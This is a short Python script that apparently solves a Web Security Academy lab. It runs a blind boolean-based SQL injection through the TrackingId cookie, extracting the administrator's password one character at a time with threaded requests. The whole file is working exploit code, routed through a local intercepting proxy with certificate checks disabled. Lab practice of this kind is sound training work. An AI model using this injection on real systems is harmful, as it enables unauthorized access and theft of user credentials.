import requests
import string
import sys
import warnings
import concurrent.futures
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

req = requests.Session()
url = "https://accc1ffb1e66089c80bb05b700cf0061.web-security-academy.net/"
hint = "Welcome back!"
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
    }
password = ""

# Payload
chars = string.digits + string.ascii_letters
index = list(range(1, 21))


def brute(str_index):
    for char in chars:
        cookies = {
            "session": "FIi00r1WMOCPXsN5k27w5assDfnmYlQM",
            "TrackingId": f"947PwkLvhe5WueLN' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),{str_index},1) = '{char}",
            }
        resp = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
        if hint in resp.text:
            found = char
            break
    return found


with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
    processes = executor.map(brute, index)


for c in processes:
    sys.stdout.write(f"\r[+] Extracting Password: {password}{c}")
    password += c
